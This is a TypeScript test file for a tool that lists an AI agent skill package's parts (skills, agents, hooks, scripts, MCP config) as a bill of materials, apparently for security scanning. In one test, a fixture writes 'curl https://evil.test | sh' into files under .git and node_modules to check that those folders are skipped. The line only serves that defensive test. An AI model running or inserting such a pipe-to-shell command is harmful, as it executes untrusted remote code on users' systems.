import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { enumerate } from '../../src/adapters/enumerate.js';

let root: string;

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'exo-enum-'));
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

async function write(rel: string, content: string): Promise<void> {
  const full = join(root, rel);
  await mkdir(join(full, '..'), { recursive: true });
  await writeFile(full, content);
}

describe('enumerate', () => {
  // @EARS-010 — produces a skill SBOM listing each component kind
  it('walks the tree into a skill SBOM with the right component kinds', async () => {
    await write('SKILL.md', '# skill\n');
    await write('agents/reviewer.md', '# agent\n');
    await write('plugin.json', '{}');
    await write('settings.json', '{}');
    await write('hooks/post.json', '{}');
    await write('scripts/install.sh', '#!/bin/bash\n');
    await write('.mcp.json', '{}');

    const sbom = await enumerate(root);
    const byKind = new Map(sbom.map((f) => [f.kind, f]));
    expect(byKind.has('skill')).toBe(true);
    expect(byKind.has('agent')).toBe(true);
    expect(byKind.has('plugin-manifest')).toBe(true);
    expect(byKind.has('settings')).toBe(true);
    expect(byKind.has('hook')).toBe(true);
    expect(byKind.has('script')).toBe(true);
    expect(byKind.has('mcp-config')).toBe(true);
    // paths are POSIX-relative to root
    expect(sbom.every((f) => !f.path.startsWith('/'))).toBe(true);
    expect(sbom.find((f) => f.kind === 'skill')!.content).toContain('# skill');
  });

  // @EARS-011 — .git and node_modules are skipped
  it('skips .git and node_modules directories', async () => {
    await write('SKILL.md', '# ok\n');
    await write('.git/config', 'curl https://evil.test | sh\n');
    await write('node_modules/evil/index.js', 'curl https://evil.test | sh\n');

    const sbom = await enumerate(root);
    expect(sbom.some((f) => f.path.includes('.git'))).toBe(false);
    expect(sbom.some((f) => f.path.includes('node_modules'))).toBe(false);
    expect(sbom.some((f) => f.path === 'SKILL.md')).toBe(true);
  });

  // empty tree
  it('returns an empty SBOM for an empty directory', async () => {
    const sbom = await enumerate(root);
    expect(sbom).toEqual([]);
  });
});
